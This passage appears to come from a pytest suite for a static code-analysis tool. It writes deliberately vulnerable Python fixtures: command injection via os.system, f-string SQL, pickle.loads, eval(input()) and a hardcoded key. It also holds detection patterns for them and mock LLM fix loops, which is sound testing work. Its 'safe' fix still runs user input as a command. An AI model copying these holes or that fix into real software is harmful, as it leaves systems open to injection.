    poor_results = list(query_executor.execute(query, [poor_doc_file]))
    good_results = list(query_executor.execute(query, [good_doc_file]))
    assert len(good_results) > len(poor_results)

def test_analyze_llm_error_handling(query_executor, tmp_path):
    """Test analysis of LLM-generated error handling improvements."""
    # Create file with poor error handling
    poor_error_file = tmp_path / "poor_error.py"
    poor_error_file.write_text('''
    def process_file(filename):
        f = open(filename)
        data = f.read()
        f.close()
        return data

    def calculate_value(x):
        return 100 / x

    def get_item(items, index):
        return items[index]
    ''')

    # Create LLM-improved version
    good_error_file = tmp_path / "good_error.py"
    good_error_file.write_text('''
    from typing import List, Any
    from contextlib import contextmanager
    import logging

    logger = logging.getLogger(__name__)

    @contextmanager
    def safe_file_handling(filename: str):
        """Safely handle file operations with proper cleanup."""
        file = None
        try:
            file = open(filename)
            yield file
        except FileNotFoundError:
            logger.error(f"File not found: {filename}")
            raise
        except IOError as e:
            logger.error(f"IO error processing {filename}: {e}")
            raise
        finally:
            if file:
                file.close()

    def process_file(filename: str) -> str:
        """Process a file with proper error handling.

        Args:
            filename: Path to the file to process.

        Returns:
            The contents of the file.

        Raises:
            FileNotFoundError: If the file doesn't exist.
            IOError: If there's an error reading the file.
        """
        with safe_file_handling(filename) as f:
            return f.read()

    def calculate_value(x: float) -> float:
        """Calculate 100 divided by x with zero division check.

        Args:
            x: The divisor value.

        Returns:
            The result of 100/x.

        Raises:
            ValueError: If x is zero.
        """
        if x == 0:
            raise ValueError("Cannot divide by zero")
        return 100 / x

    def get_item(items: List[Any], index: int) -> Any:
        """Safely get an item from a list with bounds checking.

        Args:
            items: The list to get an item from.
            index: The index of the desired item.

        Returns:
            The item at the specified index.

        Raises:
            IndexError: If the index is out of bounds.
        """
        if not items:
            raise ValueError("Cannot get item from empty list")
        if not 0 <= index < len(items):
            raise IndexError(f"Index {index} out of bounds for list of size {len(items)}")
        return items[index]
    ''')

    # Test for context manager usage
    query = PatternNode(pattern='@contextmanager')
    results = list(query_executor.execute(query, [good_error_file]))
    assert len(results) == 1

    # Test for try-except blocks
    query = PatternNode(pattern='try:.*except.*:.*finally:.*', case_sensitive=False)
    poor_results = list(query_executor.execute(query, [poor_error_file]))
    good_results = list(query_executor.execute(query, [good_error_file]))
    assert len(good_results) > len(poor_results)

    # Test for input validation
    query = PatternNode(pattern='if.*raise')
    poor_results = list(query_executor.execute(query, [poor_error_file]))
    good_results = list(query_executor.execute(query, [good_error_file]))
    assert len(good_results) > len(poor_results)

# LLM Integration Loop Tests
def test_analyze_llm_fix_loop(query_executor, tmp_path):
    """Test the detect → fix → re-check loop with LLM-generated fixes."""
    # Initial code with issues
    initial_file = tmp_path / "initial.py"
    initial_file.write_text('''
    def process_data(user_input):
        # Multiple issues to be fixed iteratively

        # Issue 1: Command injection
        os.system(user_input)

        # Issue 2: SQL injection
        query = f"SELECT * FROM users WHERE id = {user_input}"
        db.execute(query)

        # Issue 3: Unsafe deserialization
        data = pickle.loads(user_input)

        return data
    ''')

    # First LLM fix attempt - addresses command injection
    first_fix = tmp_path / "fix1.py"
    first_fix.write_text('''
    import subprocess
    import shlex

    def process_data(user_input):
        # Fix 1: Safe command execution
        subprocess.run(shlex.split(user_input), shell=False)

        # Still present:
        # Issue 2: SQL injection
        query = f"SELECT * FROM users WHERE id = {user_input}"
        db.execute(query)

        # Issue 3: Unsafe deserialization
        data = pickle.loads(user_input)

        return data
    ''')

    # Second LLM fix attempt - addresses SQL injection
    second_fix = tmp_path / "fix2.py"
    second_fix.write_text('''
    import subprocess
    import shlex
    from sqlalchemy import text

    def process_data(user_input):
        # Fix 1: Safe command execution
        subprocess.run(shlex.split(user_input), shell=False)

        # Fix 2: Parameterized query
        query = text("SELECT * FROM users WHERE id = :id")
        db.execute(query, {"id": user_input})

        # Still present:
        # Issue 3: Unsafe deserialization
        data = pickle.loads(user_input)

        return data
    ''')

    # Final LLM fix - addresses all issues
    final_fix = tmp_path / "fix3.py"
    final_fix.write_text('''
    import subprocess
    import shlex
    from sqlalchemy import text
    import json
    from typing import Any

    def process_data(user_input: str) -> Any:
        """Process user input safely with proper validation.

        Args:
            user_input: The input string to process.

        Returns:
            The processed data.

        Raises:
            ValueError: If the input is invalid or unsafe.
        """
        # Fix 1: Safe command execution
        subprocess.run(shlex.split(user_input), shell=False)

        # Fix 2: Parameterized query
        query = text("SELECT * FROM users WHERE id = :id")
        db.execute(query, {"id": user_input})

        # Fix 3: Safe deserialization using JSON
        try:
            data = json.loads(user_input)
        except json.JSONDecodeError:
            raise ValueError("Invalid JSON input")

        return data
    ''')

    # Test initial version
    def check_issues(file_path):
        issues = []
        # Check for command injection
        query = DataflowNode(source='user_input', sink='os.system')
        if list(query_executor.execute(query, [file_path])):
            issues.append('command_injection')

        # Check for SQL injection
        query = PatternNode(pattern='SELECT.*\\{.*\\}')
        if list(query_executor.execute(query, [file_path])):
            issues.append('sql_injection')

        # Check for unsafe deserialization
        query = PatternNode(pattern='pickle\\.loads')
        if list(query_executor.execute(query, [file_path])):
            issues.append('unsafe_deserialization')

        return issues

    # Verify initial issues
    initial_issues = check_issues(initial_file)
    assert len(initial_issues) == 3
    assert 'command_injection' in initial_issues
    assert 'sql_injection' in initial_issues
    assert 'unsafe_deserialization' in initial_issues

    # Verify first fix
    first_fix_issues = check_issues(first_fix)
    assert len(first_fix_issues) == 2
    assert 'command_injection' not in first_fix_issues
    assert 'sql_injection' in first_fix_issues
    assert 'unsafe_deserialization' in first_fix_issues

    # Verify second fix
    second_fix_issues = check_issues(second_fix)
    assert len(second_fix_issues) == 1
    assert 'unsafe_deserialization' in second_fix_issues

    # Verify final fix
    final_issues = check_issues(final_fix)
    assert len(final_issues) == 0

def test_analyze_llm_incremental_fixes(query_executor, tmp_path):
    """Test incremental analysis and fixes during long-running LLM interactions."""
    # Create a file with multiple issues
    code_file = tmp_path / "long_analysis.py"
    code_file.write_text('''
    def process_batch(items):
        """Process a batch of items with multiple potential issues."""
        results = []

        for item in items:
            # Security issues
            os.system(item.command)  # Issue 1
            eval(item.expression)    # Issue 2

            # Performance issues
            time.sleep(1)           # Issue 3
            results.extend([x for x in item.data if complex_check(x)])  # Issue 4

            # Resource issues
            with open(item.filename, 'r') as f:  # Issue 5
                data = f.read()

            # Error handling issues
            try:
                process_data(data)
            except:  # Issue 6
                pass

        return results
    ''')

    def analyze_incrementally(file_path, focus_area):
        """Simulate incremental analysis focusing on different aspects."""
        issues = []

        if focus_area == 'security':
            # Check for command injection
            query = DataflowNode(source='item.command', sink='os.system')
            if list(query_executor.execute(query, [file_path])):
                issues.append('command_injection')

            # Check for eval usage
            query = PatternNode(pattern='eval\\(')
            if list(query_executor.execute(query, [file_path])):
                issues.append('unsafe_eval')

        elif focus_area == 'performance':
            # Check for sleep calls
            query = PatternNode(pattern='time\\.sleep')
            if list(query_executor.execute(query, [file_path])):
                issues.append('blocking_sleep')

            # Check for inefficient list operations
            query = PatternNode(pattern='\\[.*for.*if.*\\]')
            if list(query_executor.execute(query, [file_path])):
                issues.append('inefficient_list_comp')

        elif focus_area == 'resources':
            # Check for unclosed resources
            query = PatternNode(pattern='open\\(.*\\)')
            if list(query_executor.execute(query, [file_path])):
                issues.append('resource_handling')

        elif focus_area == 'error_handling':
            # Check for bare except
            query = PatternNode(pattern='except:')
            if list(query_executor.execute(query, [file_path])):
                issues.append('bare_except')

        return issues

    # Test incremental analysis
    security_issues = analyze_incrementally(code_file, 'security')
    assert len(security_issues) == 2
    assert 'command_injection' in security_issues
    assert 'unsafe_eval' in security_issues

    performance_issues = analyze_incrementally(code_file, 'performance')
    assert len(performance_issues) == 2
    assert 'blocking_sleep' in performance_issues
    assert 'inefficient_list_comp' in performance_issues

    resource_issues = analyze_incrementally(code_file, 'resources')
    assert len(resource_issues) == 1
    assert 'resource_handling' in resource_issues

    error_issues = analyze_incrementally(code_file, 'error_handling')
    assert len(error_issues) == 1
    assert 'bare_except' in error_issues

def test_analyze_llm_monitoring_metrics(query_executor, tmp_path):
    """Test collection of monitoring metrics during LLM-driven analysis."""
    # Create a file to analyze
    test_file = tmp_path / "monitored_analysis.py"
    test_file.write_text('''
    def risky_function():
        eval(input())  # Security issue

    def complex_function():
        if condition1:
            if condition2:
                if condition3:
                    if condition4:
                        return value  # Complexity issue

    def resource_function():
        open('file.txt')  # Resource issue
    ''')

    # Simulate monitoring metrics collection
    class MockMetricsCollector:
        def __init__(self):
            self.security_issues = 0
            self.complexity_issues = 0
            self.resource_issues = 0
            self.analysis_time = 0.0

        def record_analysis(self, start_time, end_time, issues):
            self.analysis_time = end_time - start_time
            for issue in issues:
                if issue.type == 'security':
                    self.security_issues += 1
                elif issue.type == 'complexity':
                    self.complexity_issues += 1
                elif issue.type == 'resource':
                    self.resource_issues += 1

    metrics = MockMetricsCollector()

    # Test security analysis
    start_time = time.time()
    security_query = PatternNode(pattern='eval\\(input\\(\\)\\)')
    security_results = list(query_executor.execute(security_query, [test_file]))
    metrics.record_analysis(start_time, time.time(),
                          [MockIssue('security') for _ in security_results])

    # Test complexity analysis
    start_time = time.time()
    complexity_query = MetricsNode(metric_type='complexity', threshold=3)
    complexity_results = list(query_executor.execute(complexity_query, [test_file]))
    metrics.record_analysis(start_time, time.time(),
                          [MockIssue('complexity') for _ in complexity_results])

    # Test resource analysis
    start_time = time.time()
    resource_query = PatternNode(pattern='open\\(')
    resource_results = list(query_executor.execute(resource_query, [test_file]))
    metrics.record_analysis(start_time, time.time(),
                          [MockIssue('resource') for _ in resource_results])

    # Verify metrics
    assert metrics.security_issues == 1
    assert metrics.complexity_issues == 1
    assert metrics.resource_issues == 1
    assert metrics.analysis_time > 0

class MockIssue:
    def __init__(self, type):
        self.type = type

# CLI Integration Tests
def test_cli_analyze_command(query_executor, tmp_path):
    """Test the analyze command integration with the Computer Use Demo."""
    # Create a sample project directory
    project_dir = tmp_path / "demo-app"
    project_dir.mkdir()

    # Create some sample files with issues
    main_file = project_dir / "main.py"
    main_file.write_text('''
    def process_input():
        user_input = input()
        os.system(user_input)  # Security issue

        with open('data.txt') as f:  # Resource issue
            data = f.read()

        eval(data)  # Another security issue
    ''')

    util_file = project_dir / "utils.py"
    util_file.write_text('''
    def complex_function():
        if condition1:
            if condition2:
                if condition3:
                    return value  # Complexity issue
    ''')

    # Mock CLI command execution
    class MockCLI:
        def __init__(self):
            self.last_command = None
            self.results = []

        def execute(self, command, args):
            self.last_command = (command, args)
            if command == 'analyze':
                # Simulate analysis results
                return [
                    {'file': str(main_file), 'type': 'security', 'line': 3},
                    {'file': str(main_file), 'type': 'security', 'line': 8},
                    {'file': str(main_file), 'type': 'resource', 'line': 5},
                    {'file': str(util_file), 'type': 'complexity', 'line': 1}
                ]
            return []

    cli = MockCLI()

    # Test basic analysis command
    results = cli.execute('analyze', [str(project_dir)])
    assert cli.last_command[0] == 'analyze'
    assert str(project_dir) in cli.last_command[1]
    assert len(results) == 4

    # Verify security issues
    security_issues = [r for r in results if r['type'] == 'security']
    assert len(security_issues) == 2

    # Verify resource issues
    resource_issues = [r for r in results if r['type'] == 'resource']
    assert len(resource_issues) == 1

    # Verify complexity issues
    complexity_issues = [r for r in results if r['type'] == 'complexity']
    assert len(complexity_issues) == 1

def test_analysis_tool_integration(query_executor, tmp_path):
    """Test the AnalysisTool integration with the Computer Use Demo environment."""
    # Create a mock project directory
    project_dir = tmp_path / "test-project"
    project_dir.mkdir()

    # Create files with various issues
    (project_dir / "app.py").write_text('''
    def unsafe_function():
        user_input = input()
        os.system(user_input)
    ''')

    (project_dir / "config.py").write_text('''
    API_KEY = "hardcoded_secret_key"
    DEBUG = True
    ''')

    # Mock AnalysisTool implementation
    class MockAnalysisTool:
        def __init__(self, query_executor):
            self.query_executor = query_executor
            self.last_analysis = None
            self.cache = {}

        def analyze_directory(self, directory, options=None):
            """Analyze a directory using Code Sentinel."""
            self.last_analysis = {
                'directory': directory,
                'options': options or {}
            }

            # Check cache for recent analysis
            cache_key = f"{directory}:{options}"
            if cache_key in self.cache:
                return self.cache[cache_key]

            # Perform analysis
            issues = []

            # Security check: command injection
            query = DataflowNode(source='input', sink='os.system')
            results = list(self.query_executor.execute(query, [directory / "app.py"]))
            if results:
                issues.append({
                    'type': 'security',
                    'subtype': 'command_injection',
                    'file': 'app.py',
                    'line': results[0].line_number
                })

            # Security check: hardcoded secrets
            query = PatternNode(pattern='(API_KEY|SECRET|PASSWORD).*=.*["\']\\w+["\']')
            results = list(self.query_executor.execute(query, [directory / "config.py"]))
            if results:
                issues.append({
                    'type': 'security',
                    'subtype': 'hardcoded_secret',
                    'file': 'config.py',
                    'line': results[0].line_number
                })

            # Cache results
            self.cache[cache_key] = issues
            return issues

    # Create and test the AnalysisTool
    tool = MockAnalysisTool(query_executor)

    # Test basic analysis
    results = tool.analyze_directory(project_dir)
    assert len(results) == 2
    assert tool.last_analysis['directory'] == project_dir

    # Verify command injection detection
    security_issues = [r for r in results if r['type'] == 'security']
    assert len(security_issues) == 2
    assert any(i['subtype'] == 'command_injection' for i in security_issues)
    assert any(i['subtype'] == 'hardcoded_secret' for i in security_issues)

    # Test caching
    cached_results = tool.analyze_directory(project_dir)
    assert cached_results == results

    # Test with options
    results_with_options = tool.analyze_directory(project_dir, {'ignore_patterns': ['*.pyc']})
    assert tool.last_analysis['options']['ignore_patterns'] == ['*.pyc']

def test_agentic_loop_integration(query_executor, tmp_path):
    """Test integration with the agentic sampling loop."""
    # Create a mock project directory
    project_dir = tmp_path / "agent-test"
    project_dir.mkdir()

    # Create a file with issues
    (project_dir / "main.py").write_text('''
    def process_data():
        # Security issue
        os.system(input())

        # Resource issue
        with open('data.txt') as f:
            data = f.read()

        # Performance issue
        time.sleep(1)
    ''')

    # Mock agentic loop components
    class MockAgentLoop:
        def __init__(self, analysis_tool):
            self.analysis_tool = analysis_tool
            self.edit_tool = MockEditTool()
            self.actions = []

        def execute_action(self, action, **kwargs):
            self.actions.append((action, kwargs))
            if action == 'analyze':
                return self.analysis_tool.analyze_directory(kwargs['directory'])
            elif action == 'edit':
                return self.edit_tool.edit_file(**kwargs)
            return None

    class MockEditTool:
        def __init__(self):
            self.edits = []

        def edit_file(self, file_path, changes):
            self.edits.append((file_path, changes))
            return True

    # Create and test the agent loop
    analysis_tool = MockAnalysisTool(query_executor)
    agent_loop = MockAgentLoop(analysis_tool)

    # Test analysis action
    results = agent_loop.execute_action('analyze', directory=project_dir)
    assert len(results) > 0
    assert ('analyze', {'directory': project_dir}) in agent_loop.actions

    # Test fix action based on analysis
    if results:
        # Simulate LLM deciding to fix the security issue
        agent_loop.execute_action('edit',
                                file_path=project_dir / "main.py",
                                changes=[{
                                    'type': 'replace',
                                    'line': 3,
                                    'content': '    subprocess.run(shlex.split(input()), shell=False)'
                                }])

        assert len(agent_loop.edit_tool.edits) == 1
        assert (project_dir / "main.py") == agent_loop.edit_tool.edits[0][0]

def test_monitoring_integration(query_executor, tmp_path):
    """Test integration with the monitoring system."""
    # Create a mock project directory
    project_dir = tmp_path / "monitored-project"
    project_dir.mkdir()

    # Create test files
    (project_dir / "app.py").write_text('''
    def risky_function():
        eval(input())
    ''')

    # Mock monitoring system
    class MockMonitoring:
        def __init__(self):
            self.metrics = {
                'analysis_count': 0,
                'total_issues': 0,
                'analysis_time': 0.0,
                'issue_types': {}
            }

        def record_analysis(self, start_time, results):
            self.metrics['analysis_count'] += 1
            self.metrics['total_issues'] += len(results)
            self.metrics['analysis_time'] += time.time() - start_time

            for result in results:
                issue_type = result.get('type', 'unknown')
                self.metrics['issue_types'][issue_type] = \
                    self.metrics['issue_types'].get(issue_type, 0) + 1

    # Create and test the monitored analysis
    monitoring = MockMonitoring()
    analysis_tool = MockAnalysisTool(query_executor)

    # Perform analysis with monitoring
    start_time = time.time()
    results = analysis_tool.analyze_directory(project_dir)
    monitoring.record_analysis(start_time, results)

    # Verify monitoring metrics
    assert monitoring.metrics['analysis_count'] == 1
    assert monitoring.metrics['total_issues'] > 0
    assert monitoring.metrics['analysis_time'] > 0
    assert 'security' in monitoring.metrics['issue_types']

class MockAnalysisTool:
    """Mock implementation of the AnalysisTool for testing."""
    def __init__(self, query_executor):
        self.query_executor = query_executor
        self.last_analysis = None
        self.cache = {}

    def analyze_directory(self, directory, options=None):
        """Analyze a directory using Code Sentinel."""
        self.last_analysis = {
            'directory': directory,
            'options': options or {}
        }

        # Check cache for recent analysis
        cache_key = f"{directory}:{options}"
        if cache_key in self.cache:
            return self.cache[cache_key]

        # Perform analysis
        issues = []

        # Security check: command injection
        query = DataflowNode(source='input', sink='os.system')
        results = list(self.query_executor.execute(query, [directory / "app.py"]))
        if results:
            issues.append({
                'type': 'security',
                'subtype': 'command_injection',
                'file': 'app.py',
                'line': results[0].line_number
            })

        # Cache results
        self.cache[cache_key] = issues
        return issues
